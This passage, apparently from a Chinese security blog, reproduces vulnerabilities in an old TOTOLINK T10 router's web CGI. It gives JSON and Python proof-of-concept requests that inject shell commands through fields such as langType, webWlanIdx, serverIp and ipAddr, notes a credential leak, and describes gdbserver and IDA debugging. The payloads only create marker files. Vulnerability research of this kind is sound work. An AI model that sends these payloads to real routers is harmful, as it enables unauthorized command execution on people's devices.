class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/slaveUpgrade&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;&amp;#x27;$(/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/test123)&amp;#x27;;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104331376.png&#34; alt=&#34;image-20230514104331376&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104424860.png&#34; alt=&#34;image-20230514104424860&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-3-global-so&#34;&gt;&lt;a href=&#34;#6-3-global-so&#34; class=&#34;headerlink&#34; title=&#34;6.3 global.so&#34;&gt;&lt;/a&gt;6.3 global.so&lt;/h2&gt;&lt;p&gt;​		主要功能&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;module_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getOpMode&amp;quot;&lt;/span&gt;, getOpMode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setOpMode&amp;quot;&lt;/span&gt;, setOpMode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getGlobalFeatureBuilt&amp;quot;&lt;/span&gt;, getGlobalFeatureBuilt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getSysStatusCfg&amp;quot;&lt;/span&gt;, getSysStatusCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getLanguageCfg&amp;quot;&lt;/span&gt;, getLanguageCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setLanguageCfg&amp;quot;&lt;/span&gt;, setLanguageCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;loginAuth&amp;quot;&lt;/span&gt;, &amp;amp;loginAuth);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getSaveConfig&amp;quot;&lt;/span&gt;, &amp;amp;getSaveConfig);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getLedStatus&amp;quot;&lt;/span&gt;, getLedStatus);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getWanAutoDetect&amp;quot;&lt;/span&gt;, &amp;amp;getWanAutoDetect);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setEasyWizardCfg&amp;quot;&lt;/span&gt;, setEasyWizardCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;getEasyWizardCfg&amp;quot;&lt;/span&gt;, getEasyWizardCfg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;autoDhcp&amp;quot;&lt;/span&gt;, autoDhcp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h4 id=&#34;6-3-1-setLanguageCfg-命令执行&#34;&gt;&lt;a href=&#34;#6-3-1-setLanguageCfg-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.3.1 setLanguageCfg 命令执行&#34;&gt;&lt;/a&gt;6.3.1 setLanguageCfg 命令执行&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/setLanguageCfg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setLanguageCfg&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;langType&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;echo 123 &amp;gt; /tmp/setLanguageCfg;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112704936.png&#34; alt=&#34;image-20230514112704936&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112826832.png&#34; alt=&#34;image-20230514112826832&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;6-3-2-getLanguageCfg-信息泄露&#34;&gt;&lt;a href=&#34;#6-3-2-getLanguageCfg-信息泄露&#34; class=&#34;headerlink&#34; title=&#34;6.3.2 getLanguageCfg 信息泄露&#34;&gt;&lt;/a&gt;6.3.2 getLanguageCfg 信息泄露&lt;/h4&gt;&lt;p&gt;​		用户名密码泄露&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153514388.png&#34; alt=&#34;image-20230509153514388&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-4-firewall-so&#34;&gt;&lt;a href=&#34;#6-4-firewall-so&#34; class=&#34;headerlink&#34; title=&#34;6.4 firewall.so&#34;&gt;&lt;/a&gt;6.4 firewall.so&lt;/h2&gt;&lt;p&gt;​		防火墙的,设置防火墙相应内容. 但是这里面system执行的内容都是写死的,不可控&lt;/p&gt;
&lt;p&gt;​		有没有可能格式化字符串修改固定的值,然后进行命令利用?&lt;/p&gt;
&lt;h2 id=&#34;6-5-wireless-so&#34;&gt;&lt;a href=&#34;#6-5-wireless-so&#34; class=&#34;headerlink&#34; title=&#34;6.5 wireless.so&#34;&gt;&lt;/a&gt;6.5 wireless.so&lt;/h2&gt;&lt;h4 id=&#34;6-5-1-setWebWlanIdx-命令执行&#34;&gt;&lt;a href=&#34;#6-5-1-setWebWlanIdx-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.5.1 setWebWlanIdx 命令执行&#34;&gt;&lt;/a&gt;6.5.1 setWebWlanIdx 命令执行&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/setWebWlanIdx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setWebWlanIdx&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;webWlanIdx&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;echo 123 &amp;gt; /tmp/setWebWlanIdx;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;,data=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/setWebWlanIdx&amp;quot;,&amp;quot;hostTime&amp;quot;:&amp;quot;;echo 123 &amp;gt; /tmp/test123;&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;print(response.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114559605.png&#34; alt=&#34;image-20230514114559605&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114010466.png&#34; alt=&#34;image-20230514114010466&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;6-5-2-updateWifiInfo-命令执行&#34;&gt;&lt;a href=&#34;#6-5-2-updateWifiInfo-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.5.2 updateWifiInfo 命令执行&#34;&gt;&lt;/a&gt;6.5.2 updateWifiInfo 命令执行&lt;/h4&gt;&lt;p&gt;​		注意newMd5参数不为0&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/updateWifiInfo&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/updateWifiInfo&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;serverIp&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/updateWifiInfo;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;newMd5&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;123&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115843851.png&#34; alt=&#34;image-20230514115843851&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115827103.png&#34; alt=&#34;image-20230514115827103&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;6-5-3-meshInfoKick-命令执行&#34;&gt;&lt;a href=&#34;#6-5-3-meshInfoKick-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.5.3 meshInfoKick 命令执行&#34;&gt;&lt;/a&gt;6.5.3 meshInfoKick 命令执行&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/meshInfoKick&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/meshInfoKick&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;ipAddr&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/meshInfoKick;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514120847962.png&#34; alt=&#34;image-20230514120847962&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		有点小问题,还没调试好&lt;/p&gt;
&lt;h2 id=&#34;6-6-lan-so、wan-so、wps-so&#34;&gt;&lt;a href=&#34;#6-6-lan-so、wan-so、wps-so&#34; class=&#34;headerlink&#34; title=&#34;6.6 lan.so、wan.so、wps.so&#34;&gt;&lt;/a&gt;6.6 lan.so、wan.so、wps.so&lt;/h2&gt;&lt;p&gt;没找到&lt;/p&gt;
&lt;h1 id=&#34;七、溢出漏洞调试&#34;&gt;&lt;a href=&#34;#七、溢出漏洞调试&#34; class=&#34;headerlink&#34; title=&#34;七、溢出漏洞调试&#34;&gt;&lt;/a&gt;七、溢出漏洞调试&lt;/h1&gt;&lt;h2 id=&#34;7-1-gdbserver调试&#34;&gt;&lt;a href=&#34;#7-1-gdbserver调试&#34; class=&#34;headerlink&#34; title=&#34;7.1 gdbserver调试&#34;&gt;&lt;/a&gt;7.1 gdbserver调试&lt;/h2&gt;&lt;p&gt;​		被调试的机器下载gdbserver,然后启动 gdbserver 192.168.xx.xx:1234 .&amp;#x2F;helloworld,或者进行attach进程&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/gdb# ./gdbserver&lt;span class=&#34;number&#34;&gt;-7.10&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;-x64 :&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt; --attach &lt;span class=&#34;number&#34;&gt;17031&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Attached; pid = &lt;span class=&#34;number&#34;&gt;17031&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Listening on port &lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver&#34;&gt;https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;调试机器开启gdb后连接即可 (gdb) target remote 192.168.xx.xx:1234&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; target remote xxxxxx:&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Remote debugging using xxxxxxxx:&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Reading /home/ubuntu/gdb/pwn2 from remote target...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;warning: File transfers from remote targets can be slow. Use &lt;span class=&#34;string&#34;&gt;&amp;quot;set sysroot&amp;quot;&lt;/span&gt; to access files locally instead.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Reading /home/ubuntu/gdb/pwn2 from remote target...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Reading symbols from target:/home/ubuntu/gdb/pwn2...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(No debugging symbols found in target:/home/ubuntu/gdb/pwn2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x0000000000400a40&lt;/span&gt; in _start ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		在这里踩了很多坑,很多时候连上能成功,但是ni执行的时候就出问题了,立马断掉,进程就会挂掉,尝试很多不同的gdbserver,自己也尝试编译了一下,都失败了,马上要放弃的时候,又找了一个版本&lt;a href=&#34;https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver&#34;&gt;https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;rapid7编译的,可以正常使用了&lt;/p&gt;
&lt;h2 id=&#34;7-2-ida动态调试-远程调试&#34;&gt;&lt;a href=&#34;#7-2-ida动态调试-远程调试&#34; class=&#34;headerlink&#34; title=&#34;7.2 ida动态调试\远程调试&#34;&gt;&lt;/a&gt;7.2 ida动态调试\远程调试&lt;/h2&gt;&lt;p&gt;​		和gdbserver联动&lt;/p&gt;
&lt;h3 id=&#34;7-2-1附加调试-无符号信息&#34;&gt;&lt;a href=&#34;#7-2-1附加调试-无符号信息&#34; class=&#34;headerlink&#34; title=&#34;7.2.1附加调试(无符号信息)&#34;&gt;&lt;/a&gt;7.2.1附加调试(无符号信息)&lt;/h3&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508190616664.png&#34; alt=&#34;image-20230508190616664&#34; style=&#34;zoom: 33%;&#34;&gt;



&lt;p&gt;这种方式没有反汇编的函数信息等&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191055311.png&#34; alt=&#34;image-20230508191055311&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置mipsel &lt;/p&gt;
&lt;p&gt;选择 Processor type&lt;/p&gt;
&lt;p&gt;基本命令 &lt;a href=&#34;https://blog.csdn.net/m0_52164435/article/details/124871122&#34;&gt;https://blog.csdn.net/m0_52164435/article/details/124871122&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191409485.png&#34; alt=&#34;image-20230508191409485&#34;&gt;&lt;/p&gt;
